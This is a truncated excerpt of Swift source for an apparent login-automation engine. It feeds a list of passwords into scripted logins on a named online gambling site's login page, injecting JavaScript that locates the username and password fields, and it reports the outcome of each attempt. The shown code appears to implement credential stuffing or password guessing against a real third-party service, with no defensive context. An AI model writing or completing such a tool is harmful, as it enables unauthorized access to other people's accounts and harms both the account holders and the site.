...
final class ApexAutomationEngine {
    ...
    func executeDualFind(
        passwords: [String],
        sliderLimit: Int,
        onResult: @escaping @Sendable (String, String, String, LoginOutcome) -> Void
    ) async {
    ...
    private func handleOutcome(
        ...
        platform: String,
        onResult: @Sendable (String, String, String, LoginOutcome) -> Void
    ) async {
    ...
    private func performInjectedLogin(
        ...
        let targetURL = platform == "JoePoint"
            ? URL(string: "https://joefortunepokies.eu/login")!
        ...
        let injectScript = """
        (function() {
            var emailField = document.querySelector('#username') || document.querySelector('#email');
            var passField = document.querySelector('#password') || document.querySelector('#login-password');
